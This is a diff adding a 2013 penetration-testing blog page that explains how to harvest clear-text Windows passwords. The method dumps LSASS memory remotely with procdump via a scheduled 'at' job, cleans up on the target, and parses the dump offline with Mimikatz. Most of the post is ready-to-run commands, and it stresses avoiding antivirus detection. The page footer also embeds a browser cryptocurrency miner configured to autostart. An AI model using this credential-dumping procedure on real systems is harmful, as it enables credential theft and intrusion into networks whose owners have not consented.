@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/">Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</a></h1>
+            <span class="post-date">Jun 7, 2013 </span>
+            <div class="post-content">
+                <p>Mimikatz is now <a href="https://github.com/rapid7/meterpreter/pull/9">built into Metasploit&rsquo;s meterpreter</a>, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</p>
+
+<p>Mimikatz Minidump: <a href="http://blog.gentilkiwi.com/securite/mimikatz/minidump">http://blog.gentilkiwi.com/securite/mimikatz/minidump</a></p>
+
+<p>Procdump: <a href="http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</a></p>
+
+<p>Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)</p>
+
+<pre><code>net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
+dir \\TARGETBOX\C$
+</code></pre>
+
+<p>If that works then we want to check that we can all the &ldquo;AT&rdquo; command on the remote host:</p>
+
+<pre><code>at \\TARGETBOX
+</code></pre>
+
+<p>All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.</p>
+
+<pre><code>mkdir \\TARGETBOX\C$\Temp
+dir \\TARGETBOX\C$\Temp
+copy c:\temp\procdump.exe \\TARGETBOXC$
+copy c:\temp\procdump.bat \\TARGETBOXC$
+</code></pre>
+
+<p>The contents of procdump.bat are:</p>
+
+<pre><code>@echo off
+C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
+</code></pre>
+
+<p>I&rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&rsquo;ve dumped more than one IP that is actually the same host.</p>
+
+<p>Next we schedule the task. Use net time to determine the local time for the remote machine.</p>
+
+<pre><code>net time \\TARGETBOX
+at \\TARGETBOX 13:52 C:\Temp\procdump.bat
+</code></pre>
+
+<p>Pull down the file and clean up:</p>
+
+<pre><code>dir \\TARGETBOX\C$\Temp
+copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
+rmdir /s \\TARGETBOX\C$\Temp
+</code></pre>
+
+<p>On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:<a href="http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png">http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png</a></p>
+
+<p>Load up the Alpha version of Mimikatz, switch it to minidump mode and you&rsquo;re dumping creds:</p>
+
+<pre><code>mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+Switch to MINIDUMP
+
+mimikatz # sekurlsa::logonPasswords full
+</code></pre>
+
+<p>Thats it. Password dumping without ever using a &ldquo;Hacker&rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator <a href="http://twitter.com/gentilkiwi">@gentilkiwi</a> - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
